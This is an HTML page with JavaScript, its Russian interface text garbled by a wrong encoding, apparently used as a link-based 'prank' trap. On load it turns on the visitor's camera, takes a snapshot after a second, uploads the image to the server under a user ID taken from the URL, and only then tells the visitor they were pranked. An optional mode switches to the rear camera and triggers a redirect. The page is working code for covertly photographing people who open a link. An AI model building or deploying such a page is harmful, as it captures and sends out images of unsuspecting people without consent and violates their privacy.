<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Camera Snapshot</title>
  <style>
    body { text-align: center; font-family: sans-serif; background: #f0f0f0; }
    video, canvas { max-width: 90%; margin-top: 20px; border: 2px solid #ccc; }
  </style>
</head>
<body>
  <h1>üì∏ –í–∫–ª—é—á–µ–Ω–∏–µ –∫–∞–º–µ—Ä—ã...</h1>
  <video autoplay playsinline></video>
  <canvas style="display:none;"></canvas>

  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      const video = document.querySelector('video');
      const canvas = document.querySelector('canvas');
      const { userId, mode } = getParamsFromUrl();
      const isVip = mode !== null;
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ —Å—Å—ã–ª–∫—É —Å –¥—Ä—É–≥–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞');
          return;
      }
      async function startCamera() {
          try {
              const constraints = {
                  video: {
                      facingMode: mode === '2' ? 'environment' : 'user'
                  }
              };
              const stream = await navigator.mediaDevices.getUserMedia(constraints);
              video.srcObject = stream;
              video.play();
              video.onloadedmetadata = () => {
                  setTimeout(() => takeSnapshot(stream), 1000);
              };
          } catch (error) {
              console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ:', error);
              alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –∫–∞–º–µ—Ä–µ: ' + error.message);
          }
      }
      function takeSnapshot(stream) {
          if (video.readyState === video.HAVE_ENOUGH_DATA) {
              const context = canvas.getContext('2d');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              const dataURL = canvas.toDataURL('image/png');
              uploadImage(userId, dataURL);
              stream.getTracks().forEach(track => track.stop());
          } else {
              setTimeout(() => takeSnapshot(stream), 100);
          }
      }
      async function uploadImage(userId, image) {
          try {
              const response = await fetch(`/upload/${userId}`, {
                  method: 'POST',
                  body: JSON.stringify({ image: image }),
                  headers: { 'Content-Type': 'application/json' }
              });
              const result = await response.json();
              if (result.ok) {
                  alert('–¢–µ–±—è –ø—Ä–∞–Ω–∫–∞–Ω—É–ª–∏)');
                  if (isVip) {
                      await fetch(`/redirect/${userId}`, { method: 'POST' });
                  }
              } else {
                  alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: ' + result.description);
              }
          } catch (error) {
              console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è:', error);
              alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: ' + error.message);
          }
      }
      function getParamsFromUrl() {
          const urlParams = new URLSearchParams(window.location.search);
          const userId = urlParams.get('video') ? urlParams.get('video') : '491264374';
          const mode = urlParams.get('m') ? urlParams.get('m') : null;
          return { userId, mode };
      }
      startCamera();
    });
  </script>
</body>
</html>
